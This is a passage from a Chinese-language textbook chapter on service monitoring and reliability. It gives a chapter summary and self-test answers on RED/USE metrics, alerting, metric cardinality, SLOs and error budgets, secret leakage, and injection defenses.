- **RED 看服务**（Rate/Errors/Duration），**USE 看资源**（Utilization/Saturation/Errors）。先看 RED 确认症状，再下钻 USE 找原因。
- **按症状告警**（SLI 违反），不按原因告警（CPU、磁盘阈值），否则会造成告警疲劳。
- **指标标签只用低基数取值**；user_id、完整 URL 这类高基数信息放日志与追踪，塞进指标会让监控系统先于业务挂掉。
- **容量规划**用峰值 QPS 与压测得到的单实例容量估算实例数；压测看吞吐、延迟分位（P95/P99）与错误率，**平均延迟会掩盖尾部问题**。
- **排障**：现象→时间→范围→变化→逐层排除。复盘记录比修复本身更有长期价值。

## $\rm \S \, 32.13$ 本章自测答案

> 先闭卷作答本章“关键概念回顾”与“应用与辨析”，再核对以下答案。

### $\rm \S \, 32.13.1$ 自测答案 · 关键概念回顾
1. 参数化查询把用户输入当作数据值而不是 SQL 代码的一部分。数据库在解析 SQL 语句结构后，将参数值填入已解析的查询计划——用户输入中的任何 SQL 关键字都不会被解释为命令。
2. 日志回答“发生了什么”（离散事件），指标回答“系统整体怎么样了”（聚合统计），链路追踪回答“一个请求走了哪些路、瓶颈在哪一步”。
3. Git 历史是永久的——所有历史 commit 中仍然保存着泄露的数据。必须立即在服务端轮换密钥/密码（即生成新的并废弃旧的）。日志的访问面比数据库宽（采集器、日志平台、终端、聊天截图都在读它），写入密码/token 会让任何有日志查看权限的人直接拿到可用凭据，而且事后难以彻底撤回——采集器可能已同步、平台已备份。所以要在写入前按字段名脱敏，并避免把完整请求体整体倾倒进日志。
4. SLI 是实际测出来的指标（可计算的数值），SLO 是给该指标设的内部目标，SLA 是对客户承诺并带违约后果的商业条款（通常比 SLO 宽松）。$30$ 天内 $99.9\%$ 可用性对应的 error budget 是 $30\times24\times60\times(1-0.999)=43.2$ 分钟。预算用完后应冻结发布（只允许修 bug 与稳定性改进），把工程资源优先投入稳定性。
5. RED 用于服务（请求驱动的组件），看 Rate（请求速率）、Errors（错误率）、Duration（延迟分位数）；USE 用于资源，看 Utilization（利用率）、Saturation（饱和度/排队）、Errors（资源错误）。先看 RED 是因为它直接反映用户是否受影响、确认症状存在；确认后再下钻到 USE 找原因——只盯 CPU 容易迷路，CPU 高不一定影响用户，CPU 不高也不代表系统健康。

### $\rm \S \, 32.13.2$ 自测答案 · 应用与辨析
6. ①检查后端容器是否在运行（`docker ps`）→ ②检查后端日志中是否有错误（`docker compose logs backend`）→ ③如果后端在运行且无错误，检查反向代理配置中的 proxy_pass 地址是否正确（后端容器 IP 是否变了）。
7. 原因：标签的**基数**（不同取值组合数）几乎无限——每个用户、每个带查询参数的 URL 都是新组合，监控系统要为每个组合新建并永久保留一条时间序列，内存与磁盘被耗尽，采集超时、查询变慢，最坏情况是监控先于业务挂掉，故障时反而没有数据。正确做法是只把低基数、有界的字段做标签（HTTP 方法、状态码、**路由模板** `/api/papers/:id`、服务名、环境），把 user_id、完整 URL、错误原文放进结构化日志或追踪的 span 属性，指标只保留聚合（如按 tier 分组的 `active_users_total`）。XSS 与 SQL 注入的类似之处在于：两者都源于把不可信的数据当作可执行代码——SQL 注入把用户输入当 SQL 执行，XSS 把它当 JavaScript 执行，防御的共同思路是“数据和代码严格分离”。
8. 这条告警按**原因**而非**症状**设计：CPU 打满可能来自批处理或编译等对用户无影响的活动，用户可能完全正常，所以它频繁触发却对应不了任何行动，久了就形成告警疲劳——真正的事故淹没在噪声里。改好的形式是直接对应用户可感知的 SLI：如“5xx 错误率 $> 1\%$ 持续 $5$ 分钟”或“P95 延迟 $> 2\text{ s}$ 持续 $10$ 分钟”，并附上处理步骤与关闭条件。压测报告 P99 而不是平均延迟，是因为平均值被大量小值摊平、掩盖尾部：$99$ 个 $10\text{ ms}$ 加 $1$ 个 $10\text{ s}$，平均约 $110\text{ ms}$ 看起来正常，但 $1\%$ 的用户实际等了 $10$ 秒——P99 直接刻画最慢那部分用户的体验，才是容量与体验判断的依据。
